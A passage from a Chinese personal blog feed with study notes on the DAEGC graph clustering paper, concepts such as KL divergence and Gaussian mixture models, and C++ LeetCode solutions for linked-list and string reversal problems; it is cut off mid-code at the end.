pytorch_Dr.sky_的博客-CSDN博客</a></p><p><a href="https://www.bilibili.com/video/BV1T54y1H7Hs/?spm_id_from=333.337.search-card.all.click&vd_source=5e8f069711510b3788382a0a03ff38e5">简单快速教你理解图注意力网络graph attention network_哔哩哔哩_bilibili</a></p><p><a href="https://www.jianshu.com/p/a1dc22c3fa79">图神经网络：GAT图注意力网络原理和源码解读（tensorflow） - 简书 (jianshu.com)</a></p><p><a href="https://blog.csdn.net/jiangchao98/article/details/121873202">(39条消息) 图神经网络及其Pytorch实现_pytorch 图神经网络_jiangchao98的博客-CSDN博客</a></p><p><a href="https://blog.csdn.net/jiebaoshayebuhui/article/details/127820577?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-127820577-blog-121873202.pc_relevant_default&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-127820577-blog-121873202.pc_relevant_default&utm_relevant_index=1">(39条消息) PyTorch搭建图卷积神经网络（GCN）完成对论文分类及预测实战（附源码和数据集）_图卷积神经网络源码_showswoller的博客-CSDN博客</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 图神经网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Attributed Graph Clustering |A Deep Attentional Embedding Approach</title>
      <link href="/2023/03/06/DAEGC/"/>
      <url>/2023/03/06/DAEGC/</url>
      
        <content type="html"><![CDATA[<h1 id="论文阅读01-Attributed-Graph-Clustering-A-Deep-Attentional-Embedding-Approach"><a href="#论文阅读01-Attributed-Graph-Clustering-A-Deep-Attentional-Embedding-Approach" class="headerlink" title="论文阅读01-Attributed Graph Clustering: A Deep Attentional Embedding Approach"></a>论文阅读01-Attributed Graph Clustering: A Deep Attentional Embedding Approach</h1><h2 id="1-创新点idea"><a href="#1-创新点idea" class="headerlink" title="1. 创新点idea"></a>1. 创新点idea</h2><ol><li><strong>Two-step的图嵌入方法不是目标导向的，聚类效果不好，提出一种基于目标导向的属性图聚类框架。</strong></li></ol><p>所谓目标导向，就是说<strong>特征提取和聚类任务不是独立的</strong>，提<strong>取的特征要在一定程度上有利于聚类，</strong>那么如何实现？可以通过自训练聚类的方式，<strong>将隐藏图嵌入产生的软聚类分配与聚类联合优化</strong>。</p><ol start="2"><li><strong>提出图注意力自动编码器</strong></li></ol><h2 id="2-模型-model"><a href="#2-模型-model" class="headerlink" title="2. 模型 model"></a>2. 模型 model</h2><h3 id="1-two-step"><a href="#1-two-step" class="headerlink" title="1. two-step"></a>1. two-step</h3><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201415139.png" alt="image-20230308094038236"></p><p><code>two-step 步骤：深度学习</code>方法来学习紧凑<code>图嵌入 embedding</code>，在此<code>基础上应用的聚类方法</code></p><p><strong>two-step之前缺点：图嵌入的生成和聚类是两个独立的部分，通常会导致性能不佳。</strong></p><p><strong>这主要是因为图嵌入不是目标导向的，即专为特定的聚类任务而设计</strong></p><p><strong>DAEGC 解决办法</strong>：<code>让模型图嵌入和聚类之间联合优化</code></p><h3 id="2-模型架构图"><a href="#2-模型架构图" class="headerlink" title="2. 模型架构图"></a>2. 模型架构图</h3><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201415531.png" alt="image-20230308094148787"></p><p>​        <strong>DAEGC</strong>通过基于<strong>图注意力的自动编码器</strong>学习<strong>隐藏表示 Z</strong>，并使用<strong>自训练聚类模块对其进行操作</strong>，<code>该模块与自动编码器一起优化并在训练期间执行聚类.</code></p><p>DAEGC模型架构为两个部分：</p><ul><li><code>图注意力自动编码器部分</code></li><li><code>自训练聚类</code></li></ul><p>自然而然的，该任务的目标函数就由两部分组成，重建损失和聚类损失：L=L<em>r</em>+<em>γ</em>L<em>c</em> 。</p><h3 id="3-图注意力自动编码器"><a href="#3-图注意力自动编码器" class="headerlink" title="3. 图注意力自动编码器"></a>3. 图注意力自动编码器</h3><p>​            <strong>DAEGC</strong>这篇论文的编码器<strong>在GAT 的基础上修改 作为图编码</strong>。<strong>原GAT论文 仅考虑 1 阶相邻节点（一阶）以进行图注意力。</strong>　<code>DAEGC</code> 认为图具有复杂的结构关系，建议在<code>编码器中利用高阶邻居</code>。我们通过<code>考虑图中的 t 阶邻居节点获得邻近矩阵M： t参数可以根据实验结果，自己调节，也即是输入参数</code></p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201416881.png" alt="image-20230308094250108"></p><p><strong>接下来计算顶点之间的图注意力系数: 顶点间的图注意力是不对成的 即 aij 不等于aji</strong></p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201416969.png" alt="image-20230308100604102"></p><p>​        <strong>DAEGC 堆叠两层图注意层得到图注意力自动编码器的编码器部分:</strong></p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201416997.png" alt="image-20230308101653448"></p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201416727.png" alt="image-20230308101954296"></p><p>​        解码器采用简单的内积：</p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201416545.png" alt="image-20230308104330299"></p><p>​        损失函数Lr：</p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201416043.png" alt="image-20230308104411125"></p><h3 id="4-自训练聚类模块"><a href="#4-自训练聚类模块" class="headerlink" title="4. 自训练聚类模块"></a>4. 自训练聚类模块</h3><p>​    我们使用<strong>t-分布</strong>来衡量<strong>嵌入节点Zi</strong> 和<strong>簇中心节点Uu</strong> 之间的相似性。</p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201416300.png" alt="image-20230308105314822"></p><p>其他论文中公式：</p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201416770.png" alt="image-20230308105502219"></p><p><strong><em>qiu</em>表示节点i属于簇u的概率，将其看作是每个节点的软聚类分配标签，如果值越大，那么可信度越高</strong> 。通过平方运算将这种可信度放大：</p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201416902.png" alt="image-20230308105938080"></p><p>自训练聚类模块的损失函数采用KL 散度：</p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201416128.png" alt="image-20230308110014750"></p><p><strong>聚类损失然后迫使当前分布 Q 逼近目标分布 P ，从而将这些“置信分配”设置为软标签来监督 Q 的嵌入学习</strong></p><p>​    因此DEAGC 模型总的损失函数L：</p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201416277.png" alt="image-20230308111337066"></p><h3 id="5-DAEGC-算法流程图、"><a href="#5-DAEGC-算法流程图、" class="headerlink" title="5. DAEGC 算法流程图、"></a>5. DAEGC 算法流程图、</h3><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201416624.png" alt="image-20230308123920017"></p><h3 id="6-DAEGC-模型参数和评价标准"><a href="#6-DAEGC-模型参数和评价标准" class="headerlink" title="6. DAEGC 模型参数和评价标准"></a>6. DAEGC 模型参数和评价标准</h3><p><strong>DAEGC 参数设定</strong>：</p><p><strong>我们将聚类系数 γ 设置为 10。我们考虑二阶邻居并设置 M = (B +B2)/2。编码器由一个 256 个神经元隐藏层和一个 16 个神经元嵌入层构成，适用于所有数据集</strong>。</p><p><strong>DAEGC 评价指标：</strong></p><p>使用四个指标 [Xia et al., 2014] 来评估聚类结果：**准确性 (ACC)、归一化互信息 (NMI)、F 分数和调整兰德指数 (ARI)**。</p><p><strong>更好的聚类结果应该会导致所有指标的值更高。</strong></p><h3 id="7-实验结果分析"><a href="#7-实验结果分析" class="headerlink" title="7.实验结果分析"></a>7.实验结果分析</h3><blockquote><ol><li>实验对比</li></ol></blockquote><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201416410.png" alt="image-20230310123310585"></p><ol><li><p><code>同时使用图的结构和内容信息的方法</code>通常比<code>仅使用图的一侧信息的方法表现更好</code></p></li><li><p>DAEGC模型为啥好：</p><p><code>（1）我们采用了图注意力网络，有效地整合了图的内容和结构信息；</code> </p><p><code>（2） 我们的自训练聚类组件在提高聚类效率方面专业而强大</code></p></li></ol><blockquote><ol start="2"><li>嵌入层维度</li></ol></blockquote><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201416374.png" alt="image-20230310123005772"></p><p><code>嵌入层维度分析：</code><br><strong><code>当嵌入维度从 4 个神经元增加到 16 个神经元时，聚类性能稳步上升；但是当我们进一步增加嵌入层的神经元时，性能会有所波动，尽管 ACC 和 NMI 分数总体上都保持良好</code></strong></p><blockquote><ol start="3"><li>可视化分析</li></ol></blockquote><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201416372.png" alt="image-20230310123424500"></p><p>第一个可视化说明<code>仅使用图形注意自动编码器进行嵌入训练</code>，然后是显示后续相等时期的可视化，其中包含<code>自训练组件，直到最后一个是最终的嵌入可视化</code></p><h2 id="额外知识补充"><a href="#额外知识补充" class="headerlink" title="额外知识补充"></a>额外知识补充</h2><h3 id="student-t分布"><a href="#student-t分布" class="headerlink" title="student t分布"></a>student t分布</h3><p>对于 <code>i 样本和 j</code> 样本，我们使用 Student 的 <code>t 分布</code>作为核心来度量<code>嵌入点 hi 和聚类中心向量 μj</code> 之间的相似性，如下所示：</p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201416598.png" alt="image-20230306213807740"></p><p><code>qij</code>可以看作是将<code>样本i分配</code>给<code>聚类j的概率</code>，即软分配。</p><p><strong><code>注意点：</code></strong> <strong><code>t=1</code></strong>  </p><p>解释</p><p>我们无法在<strong>无监督环境中对验证集上的 t 进行交叉验证</strong>，并且<strong>学习它是多余的</strong>（van der Maaten，2009），我们让<strong>所有实验的 t= 1</strong>。</p><p><a href="https://zhuanlan.zhihu.com/p/50365577">无监督的深度嵌入式聚类分析 - 知乎 (zhihu.com)</a></p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://zhuanlan.zhihu.com/p/50365577">无监督的深度嵌入式聚类分析 - 知乎 (zhihu.com)</a></p><p><a href="https://zhuanlan.zhihu.com/p/467248262">文献+代码—AAAI’20 对话系统新意图发现( Constrained Deep Adaptive Clustering with Cluster Refinement) - 知乎 (zhihu.com)</a></p><p><a href="https://www.marigold.website/readArticle?workId=102&author=Marigold&authorId=1000001">论文阅读02——《Attributed Graph Clustering: A Deep Attentional Embedding Approach》 (marigold.website)</a></p><h2 id="DAEGC-代码"><a href="#DAEGC-代码" class="headerlink" title="DAEGC 代码"></a>DAEGC 代码</h2><p>出现问题解决办法：</p><p><a href="https://developer.aliyun.com/article/1138200">在torch_geometric.datasets中使用Planetoid手动导入Core数据集及发生相关错误解决方案-阿里云开发者社区 (aliyun.com)</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 论文 </tag>
            
            <tag> 深度聚类 </tag>
            
            <tag> 图深度学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>206. 反转链表</title>
      <link href="/2023/03/06/206-%E5%8F%8D%E8%BD%AC%E9%93%BE%E8%A1%A8/"/>
      <url>/2023/03/06/206-%E5%8F%8D%E8%BD%AC%E9%93%BE%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="206-反转链表"><a href="#206-反转链表" class="headerlink" title="206. 反转链表"></a><a href="https://leetcode.cn/problems/reverse-linked-list/">206. 反转链表</a></h1><h2 id="题目示例"><a href="#题目示例" class="headerlink" title="题目示例"></a>题目示例</h2><p>给你单链表的头节点 <code>head</code> ，请你反转链表，并返回反转后的链表。</p><pre class=" language-python"><code class="language-python">输入：head <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span>输出：<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span></code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><h3 id="1-双指针"><a href="#1-双指针" class="headerlink" title="1. 双指针"></a>1. 双指针</h3><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201423262.png" alt="image-20230306120034233"></p><pre class=" language-c++"><code class="language-c++">class Solution &#123;public:    ListNode* reverseList(ListNode* head) &#123;       ListNode *cur=NULL,*pre=head;       while(pre!=NULL)&#123;           ListNode *temp=pre->next;           pre->next=cur;           cur=pre;           pre=temp;       &#125;       return cur;    &#125;&#125;;</code></pre><p><a href="https://leetcode.cn/problems/reverse-linked-list/solution/fan-zhuan-lian-biao-shuang-zhi-zhen-di-gui-yao-mo-/">【反转链表】：双指针，递归，妖魔化的双指针 - 反转链表 - 力扣（LeetCode）</a></p><h3 id="2-递归"><a href="#2-递归" class="headerlink" title="2. 递归"></a>2. 递归</h3><pre class=" language-c++"><code class="language-c++">class Solution &#123;public:    ListNode* reverseList(ListNode* head) &#123;       if(head==NULL ||head->next==NULL)// 1 表示没有节点，或者只有一个节点时候            return head;                ListNode *cur=reverseList(head->next);// 2        head->next->next=head;//3        head->next=NULL;//3        return cur;//2    &#125;&#125;;</code></pre><p><a href="https://leetcode.cn/problems/reverse-linked-list/solution/jian-dan-yi-dong-javac-pythonjsgo-dong-h-8hvk/">简单易懂Java/C++ /Python/js/go 动画讲解 - 反转链表 - 反转链表 - 力扣（LeetCode）</a></p><h2 id="复杂度分析"><a href="#复杂度分析" class="headerlink" title="复杂度分析"></a>复杂度分析</h2><ul><li>时间复杂度：<strong>O(n)**，假设<code>n</code>是列表的长度，时间复杂度是</strong>O(n)**。</li><li>空间复杂度：**O(1)**。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> leetcode </tag>
            
            <tag> 双指针 </tag>
            
            <tag> 链表 </tag>
            
            <tag> 递归 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>58 - II. 左旋转字符串</title>
      <link href="/2023/03/03/58-II-%E5%B7%A6%E6%97%8B%E8%BD%AC%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
      <url>/2023/03/03/58-II-%E5%B7%A6%E6%97%8B%E8%BD%AC%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
      
        <content type="html"><![CDATA[<h1 id="58-II-左旋转字符串"><a href="#58-II-左旋转字符串" class="headerlink" title=" 58 - II. 左旋转字符串"></a><a href="https://leetcode.cn/problems/zuo-xuan-zhuan-zi-fu-chuan-lcof/"> 58 - II. 左旋转字符串</a></h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><pre class=" language-python"><code class="language-python">字符串的左旋转操作是把字符串前面的若干个字符转移到字符串的尾部。请定义一个函数实现字符串左旋转操作的功能。比如，输入字符串<span class="token string">"abcdefg"</span>和数字<span class="token number">2</span>，该函数将返回左旋转两位得到的结果<span class="token string">"cdefgab"</span>。来源：力扣（LeetCode）链接：https<span class="token punctuation">:</span><span class="token operator">//</span>leetcode<span class="token punctuation">.</span>cn<span class="token operator">/</span>problems<span class="token operator">/</span>zuo<span class="token operator">-</span>xuan<span class="token operator">-</span>zhuan<span class="token operator">-</span>zi<span class="token operator">-</span>fu<span class="token operator">-</span>chuan<span class="token operator">-</span>lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</code></pre><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><pre class=" language-python"><code class="language-python">示例 <span class="token number">1</span>：输入<span class="token punctuation">:</span> s <span class="token operator">=</span> <span class="token string">"abcdefg"</span><span class="token punctuation">,</span> k <span class="token operator">=</span> <span class="token number">2</span>输出<span class="token punctuation">:</span> <span class="token string">"cdefgab"</span>示例 <span class="token number">2</span>：输入<span class="token punctuation">:</span> s <span class="token operator">=</span> <span class="token string">"lrloseumgh"</span><span class="token punctuation">,</span> k <span class="token operator">=</span> <span class="token number">6</span>输出<span class="token punctuation">:</span> <span class="token string">"umghlrlose"</span> 限制：<span class="token number">1</span> <span class="token operator">&lt;=</span> k <span class="token operator">&lt;</span> s<span class="token punctuation">.</span>length <span class="token operator">&lt;=</span> <span class="token number">10000</span>来源：力扣（LeetCode）链接：https<span class="token punctuation">:</span><span class="token operator">//</span>leetcode<span class="token punctuation">.</span>cn<span class="token operator">/</span>problems<span class="token operator">/</span>zuo<span class="token operator">-</span>xuan<span class="token operator">-</span>zhuan<span class="token operator">-</span>zi<span class="token operator">-</span>fu<span class="token operator">-</span>chuan<span class="token operator">-</span>lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><h3 id="1-空间复杂度0（1）"><a href="#1-空间复杂度0（1）" class="headerlink" title="1. 空间复杂度0（1）"></a>1. 空间复杂度0（1）</h3><p><code>**不能申请额外空间，只能在本串上操作**。</code></p><ol><li><p>反转区间为前n的子串</p></li><li><p>反转区间为n到末尾的子串</p></li><li><p>反转整个字符串</p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201426401.png" alt="image-20230303091415542"></p></li></ol><pre class=" language-c++"><code class="language-c++">class Solution &#123;public:    string reverseLeftWords(string s, int n) &#123;        reverse(s.begin(), s.begin() + n);        reverse(s.begin() + n, s.end());        reverse(s.begin(), s.end());        return s;    &#125;&#125;;</code></pre><h3 id="2-空间复杂度为0-n"><a href="#2-空间复杂度为0-n" class="headerlink" title="2. 空间复杂度为0(n)"></a>2. 空间复杂度为0(n)</h3><p><code>字符串倍增</code>成<code>为两个同样的字符串拼接的长字符</code>串然后想旋转均可.</p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201426062.png" alt="image-20230303091541113" style="zoom:200%;" /><pre class=" language-c++"><code class="language-c++">class Solution &#123;public:    string reverseLeftWords(string s, int n) &#123;        int len = s.size();        s += s;        return s.substr(n,len);    &#125;&#125;;</code></pre><blockquote><p> 时间复杂度都是 0（N）</p></blockquote><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><strong><a href="https://programmercarl.com/%E5%89%91%E6%8C%87Offer58-II.%E5%B7%A6%E6%97%8B%E8%BD%AC%E5%AD%97%E7%AC%A6%E4%B8%B2.html">代码随想录 (programmercarl.com)</a></strong></p><p><a href="https://leetcode.cn/problems/zuo-xuan-zhuan-zi-fu-chuan-lcof/solution/zi-fu-chuan-pin-jie-yu-qie-fen-pei-tu-by-1smm/">https://leetcode.cn/problems/zuo-xuan-zhuan-zi-fu-chuan-lcof/solution/zi-fu-chuan-pin-jie-yu-qie-fen-pei-tu-by-1smm/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> leetcode </tag>
            
            <tag> 字符串 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图深度学习知识点</title>
      <link href="/2023/03/02/%E5%9B%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
      <url>/2023/03/02/%E5%9B%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<h1 id="图深度学习知识点"><a href="#图深度学习知识点" class="headerlink" title="图深度学习知识点"></a>图深度学习知识点</h1><h2 id="1-KL散度"><a href="#1-KL散度" class="headerlink" title="1. KL散度"></a>1. KL散度</h2><blockquote><p>1 .概念</p></blockquote><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201418669.png" alt="image-20230302194935944"></p><p>两者是等价的 </p><p><code>p(x)和分布q(x)之间的**相对熵(relative entropy)或者KL散 度( Kullback-Leibler divergence )**</code></p><blockquote><ol start="2"><li>性质</li></ol></blockquote><ol><li>不对称性。</li></ol><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201418725.png" alt="image-20230302195053926"></p><pre><code>2. KL 散度大于等于0</code></pre><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201418472.png" alt="image-20230302195118638"></p><p>参考链接：</p><p><a href="https://zhuanlan.zhihu.com/p/39682125">KL散度理解 - 知乎 (zhihu.com)</a></p><blockquote><ol start="3"><li>KL 的理解</li></ol></blockquote><p><code>P往往用来表示样本的真实分布：未知分布</code></p><p><code>Q用来表示模型所预测的分布：模拟p的近似分布</code></p><p><code>那么KL散度就可以计算两个分布的差异，也就是Loss损失值。</code></p><p><strong>从KL散度公式中可以看到<code>Q的分布越接近P（Q分布越拟合P）</code>，那么散度值<code>越小，即损失值越小。</code></strong></p><p><a href="https://zhuanlan.zhihu.com/p/74075915">交叉熵、相对熵（KL散度）、JS散度和Wasserstein距离（推土机距离） - 知乎 (zhihu.com)</a></p><p><a href="https://www.zhihu.com/question/41252833/answer/195901726">(99+ 封私信 / 80 条消息) 如何通俗的解释交叉熵与相对熵？ - 知乎 (zhihu.com)</a></p><p><a href="https://zhuanlan.zhihu.com/p/37452654">初学机器学习：直观解读KL散度的数学概念 - 知乎 (zhihu.com)</a></p><blockquote><ol start="4"><li>KL 散度公式中有带负号有的不带负号为什么？</li></ol></blockquote><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201418038.png" alt="image-20230302213047904"></p><h2 id="2-贝叶斯公式"><a href="#2-贝叶斯公式" class="headerlink" title="2. 贝叶斯公式"></a>2. 贝叶斯公式</h2><blockquote><ol><li>先验和后验</li></ol></blockquote><p><code>先验概率：因得果</code>:已经知道 p(z)</p><p><code>后验概率：果推因来计算条件概率</code>：未知 p(z|X)</p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201418407.png" alt="image-20230303134332912"></p><blockquote><ol start="2"><li>贝叶斯推断和决策</li></ol></blockquote><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201418346.png" alt="image-20230303135906006"></p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201418206.png" alt="image-20230303135506642"></p><h2 id="3-高斯混合模型"><a href="#3-高斯混合模型" class="headerlink" title="3.高斯混合模型"></a>3.高斯混合模型</h2><blockquote><ol><li>单高斯模型</li></ol></blockquote><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201418300.png" alt="image-20230303131651155"></p><p><a href="https://zhuanlan.zhihu.com/p/30483076">高斯混合模型（GMM） - 知乎 (zhihu.com)</a></p><blockquote><ol start="2"><li>几何角度理解</li></ol></blockquote><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201418238.png" alt="image-20230303131446093"><br>$$<br>\begin{array}{l}<br>p(x)=\sum_{k=1}^{N} {\alpha_{k} N\left(x \mid \mu_{k} ,\Sigma_{k}\right)} \<br>\sum_{k=1}^{N}\alpha_{k}=1 \<br>\end{array}<br>$$</p><blockquote><ol start="3"><li>混合角度理解高斯</li></ol></blockquote><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201418094.png" alt="image-20230303133217965"></p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201418001.png" alt="image-20230303133030693"></p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201418077.png" alt="image-20230303133616917"></p><p>$$<br>\begin{aligned}<br>p(x) &amp; =\sum_{z} p(x, z) \<br>&amp; =\sum_{k=1}^{k} p\left(x, z=c_{k}\right) \<br>&amp; =\sum_{k=1}^{K} p\left(z=c_{k}\right) \cdot p\left(x \mid z=c_{k}\right) \<br>&amp; =\sum_{k=1}^{K} p_{k} \cdot N\left(x \mid \mu_{k}, z_{k}\right)<br>\end{aligned}<br>$$</p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201419145.png" alt="image-20230320141935089"></p><blockquote><p>总结 </p></blockquote><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201418933.png" alt="image-20230303131616932"></p><p>参考链接：<a href="https://link.zhihu.com/?target=https://www.bilibili.com/video/BV13b411w7Xj">https://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV13b411w7Xj</a></p><p><a href="https://www.bilibili.com/video/BV1aE411o7qd?p=67&vd_source=5e8f069711510b3788382a0a03ff38e5">(系列十一) 高斯混合模型2-极大似然_哔哩哔哩_bilibili</a></p><p><a href="https://www.zhihu.com/topic/20326197/top-answers">(99+ 封私信 / 80 条消息) 高斯混合模型 - 知乎 (zhihu.com)</a></p><h2 id="4-student-t分布"><a href="#4-student-t分布" class="headerlink" title="4. student t分布"></a>4. student t分布</h2><p>对于 <code>i 样本和 j</code> 样本，我们使用 Student 的 <code>t 分布</code>作为核心来度量<code>嵌入点 hi 和聚类中心向量 μj</code> 之间的相似性，如下所示：</p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201418875.png" alt="image-20230306213807740"></p><p><code>qij</code>可以看作是将<code>样本i分配</code>给<code>聚类j的概率</code>，即软分配。</p><p><strong><code>注意点：</code></strong> <strong><code>t=1</code></strong>  </p><p>解释</p><p>我们无法在<strong>无监督环境中对验证集上的 t 进行交叉验证</strong>，并且<strong>学习它是多余的</strong>（van der Maaten，2009），我们让<strong>所有实验的 t= 1</strong>。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 图深度学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>151. 反转字符串中的单词</title>
      <link href="/2023/03/02/151.%20%E5%8F%8D%E8%BD%AC%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%AD%E7%9A%84%E5%8D%95%E8%AF%8D/"/>
      <url>/2023/03/02/151.%20%E5%8F%8D%E8%BD%AC%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%AD%E7%9A%84%E5%8D%95%E8%AF%8D/</url>
      
        <content type="html"><![CDATA[<h1 id="151-反转字符串中的单词"><a href="#151-反转字符串中的单词" class="headerlink" title="151. 反转字符串中的单词"></a><a href="https://leetcode.cn/problems/reverse-words-in-a-string/">151. 反转字符串中的单词</a></h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><pre class=" language-python"><code class="language-python">给你一个字符串 s ，请你反转字符串中 单词 的顺序。单词 是由非空格字符组成的字符串。s 中使用至少一个空格将字符串中的 单词 分隔开。返回 单词 顺序颠倒且 单词 之间用单个空格连接的结果字符串。注意：输入字符串 s中可能会存在前导空格、尾随空格或者单词间的多个空格。返回的结果字符串中，单词间应当仅用单个空格分隔，且不包含任何额外的空格。来源：力扣（LeetCode）链接：https<span class="token punctuation">:</span><span class="token operator">//</span>leetcode<span class="token punctuation">.</span>cn<span class="token operator">/</span>problems<span class="token operator">/</span>reverse<span class="token operator">-</span>words<span class="token operator">-</span><span class="token keyword">in</span><span class="token operator">-</span>a<span class="token operator">-</span>string著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</code></pre><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><pre class=" language-python"><code class="language-python">示例 <span class="token number">1</span>：输入：s <span class="token operator">=</span> <span class="token string">"the sky is blue"</span>输出：<span class="token string">"blue is sky the"</span>示例 <span class="token number">2</span>：输入：s <span class="token operator">=</span> <span class="token string">"  hello world  "</span>输出：<span class="token string">"world hello"</span>解释：反转后的字符串中不能存在前导空格和尾随空格。示例 <span class="token number">3</span>：输入：s <span class="token operator">=</span> <span class="token string">"a good   example"</span>输出：<span class="token string">"example good a"</span>解释：如果两个单词间有多余的空格，反转后的字符串需要将单词间的空格减少到仅有一个。 提示：<span class="token number">1</span> <span class="token operator">&lt;=</span> s<span class="token punctuation">.</span>length <span class="token operator">&lt;=</span> <span class="token number">104</span>s 包含英文大小写字母、数字和空格 <span class="token string">' '</span>s 中 至少存在一个 单词来源：力扣（LeetCode）链接：https<span class="token punctuation">:</span><span class="token operator">//</span>leetcode<span class="token punctuation">.</span>cn<span class="token operator">/</span>problems<span class="token operator">/</span>reverse<span class="token operator">-</span>words<span class="token operator">-</span><span class="token keyword">in</span><span class="token operator">-</span>a<span class="token operator">-</span>string著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><h3 id="算法流程"><a href="#算法流程" class="headerlink" title="算法流程"></a>算法流程</h3><p><code>对于字符串不可变的语言</code>，首先得把字符串转化成其他可变的数据结构，同时还需要在转化的过程中去除空格。</p><p><code>java python</code></p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201423307.png" alt="image-20230302161254310"></p><p><code>对于字符串可变的语言 c++</code>，就不需要再额外开辟空间了，直接在字符串上原地实现。在这种情况下，反转字符和去除空格可以一起完成</p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201424192.png" alt="image-20230302161410390"></p><ol><li><code>**移除多余空格**</code>      </li><li><code>**反转整个字符**</code></li><li><code>**依次反转每个单词**</code></li></ol><pre class=" language-c++"><code class="language-c++">class Solution &#123;public:    void reverse(string& s, int start, int end)&#123; //翻转，区间写法：左闭右闭 []        for (int i = start, j = end; i < j; i++, j--) &#123;            swap(s[i], s[j]);        &#125;    &#125;    void removeExtraSpaces(string& s) &#123;//去除所有空格并在相邻单词之间添加空格, 快慢指针。        int slow = 0;   //整体思想参考https://programmercarl.com/0027.移除元素.html        for (int i = 0; i < s.size(); ++i) &#123; //            if (s[i] != ' ') &#123; //遇到非空格就处理，即删除所有空格。                if (slow != 0)                     s[slow++] = ' '; //手动控制空格，给单词之间添加空格。slow != 0说明不是第一个单词，需要在单词前添加空格。                while (i < s.size() && s[i] != ' 